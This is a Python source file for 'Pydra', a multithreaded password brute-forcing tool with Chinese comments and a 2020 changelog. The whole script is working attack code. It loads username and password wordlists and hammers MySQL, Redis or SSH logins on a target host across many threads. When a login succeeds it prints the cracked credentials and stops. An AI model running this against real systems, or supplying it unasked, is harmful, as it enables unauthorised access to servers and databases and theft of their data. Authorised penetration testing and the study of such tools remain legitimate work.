#!/usr/bin/python3 

# 2020-03-17
# [✅] mysql登录爆破
# 增加mysql超时重连
# 读取数量修改为线程数100倍
# 2020-03-18
# [❌] 增加Windows Powershell登录爆破 [!] 待完善
# 2020-03-19
# [❌] 增加mssql爆破 [!] 待完善
# [✅] redis爆破

import time 
import optparse
import queue
import threading

import pymysql
import redis
from pexpect import pxssh  # ssh


class Pydra:
    def __init__(self, options):
        self.ctype = options.ctype
        self.host = options.host
        if options.port is None:
            if self.ctype == "mysql":
                self.port = 3306
            elif self.ctype == "redis":
                self.port = 6379
            elif self.ctype == "ssh":
                self.port = 22
            # [!] 未完待续
        else:
            self.port = options.port
        self.ufile = options.userfile
        self.pfile = options.passfile
        self.thread = options.thread
        self.timeout = options.timeout
        self.verbose = options.verbose

        self.threshold = 100 * self.thread  
        self.queue = queue.Queue()  
        self.success = False
        self.result = dict()
        self.st = time.time()  

    def read_user(self):
        # 读取.txt文档
        if ".txt" in self.ufile:  
            with open(self.ufile, 'r', encoding='utf-8') as uf:
                for user in uf.readlines():
                    self.read_pass(user.strip())  # 当前user遍历整个pass
        # 使用用户名
        else:
            self.read_pass(self.ufile)  

    def read_pass(self, user):
        # 读取密码字典.txt
        if ".txt" in self.pfile:
            with open(self.pfile, 'r', encoding='utf-8') as pf:
                for pwd in pf.readlines():
                    pwd = pwd.strip()
                    # 在阈值内，密码入队列
                    if self.queue.qsize() < self.threshold:  
                        # print("Put into list: " + user + " " + pwd)
                        self.queue.put(user + "\t" + pwd)
                    # 队列满，多线程爆破
                    else:  
                        self.thread_brute()
                # 处理多余部分
                self.thread_brute()
        # 传入参数为单密码
        else:  
            # 调用爆破工具
            if self.ctype == "mysql":
                self.brute_mysql(user, self.pfile)
            elif self.ctype == "redis":
                self.brute_redis(self.pfile)
            elif self.ctype == "ssh":
                self.brute_ssh(user, self.pfile)

    def thread_brute(self):
        if not self.success:  # 未尝试成功
            threads = list()  # 子线程列表
            for n in range(self.thread):
                t = threading.Thread(target=self.brute, )  # 创建线程
                t.setDaemon(True)  
                t.start()  # 启动线程
                threads.append(t)   
            for t in threads:
                t.join()  # 等待子进程结束
        else:  # 成功时终止程序
            return

    def brute(self):
        while not self.queue.empty() and not self.success:
            user, pwd = self.queue.get().split("\t")

            # 调用爆破工具
            if self.ctype == "mysql":
                self.brute_mysql(user, pwd)
            elif self.ctype == "redis":
                self.brute_redis(pwd)
            elif self.ctype == "ssh":
                self.brute_ssh(user, pwd)

    def brute_mysql(self, user, pwd):
        try:
            if self.verbose:
                print("[-] try mysql connect: ", user, "@", pwd)
            pymysql.connect(host=self.host, user=user, password=pwd, port=self.port, 
                            connect_timeout=self.timeout)  # 超时设置
            self.brute_done(user, pwd)
        except Exception as e:
            if "timed out" in str(e):  # 超时重连
                self.brute_mysql(user, pwd)
            return

    def brute_redis(self, pwd):
        try:
            if self.verbose:
                print("[-] try redis connect:", pwd)
            r = redis.StrictRedis(host=self.host, password=pwd, port=self.port, socket_timeout=self.timeout)
            if r.ping():
                self.brute_done(self.ufile, pwd)
        except Exception as e:
            # print(e)
            return

    def brute_ssh(self, user, pwd):
        try:
            s = pxssh.pxssh()
            s.login(self.host, username=user, password=pwd, port=self.port)
            self.brute_done(user, pwd)
        except Exception as e:
            print(e)
            s.close()
            pass

    def brute_done(self, user, pwd):
        print("[+] success login by: ", user, "@", pwd)
        self.success = True
        self.result[user] = pwd
        et = time.time()
        print("[!] Crack time spend:", et-self.st)

    def run(self):
        print("[!] Aim host: " + self.host + ", Crack type: " + self.ctype)
        self.read_user()
        print("[!] Result", self.result)
        et = time.time()
        print("[!] Total time spend:", et-self.st)


def main():
    parser = optparse.OptionParser(usage="python3 %prog [options] arg")
    parser.add_option('-T', '--ctype', dest="ctype", default="mysql", help="crack type")
    parser.add_option('-H', '--host', dest="host", default="127.0.0.1", help="hostname")
    parser.add_option('-P', '--port', type=int, dest="port", help="port")
    parser.add_option('-u', '--userfile', dest="userfile", default="root", help="username or userfile")
    parser.add_option('-p', '--passfile', dest="passfile", default="root", help="password or passfile")
    parser.add_option('-t', '--thread', type=int, dest="thread", default=8, help="thread")
    parser.add_option('-o', '--timeout', type=int, dest="timeout", default=1, help="time out")
    parser.add_option('-q', '--quiet', action="store_false", default=True, dest="verbose", help="keep quiet")

    (options, args) = parser.parse_args()  
    Pydra(options).run()                

if __name__ == "__main__":
   main()
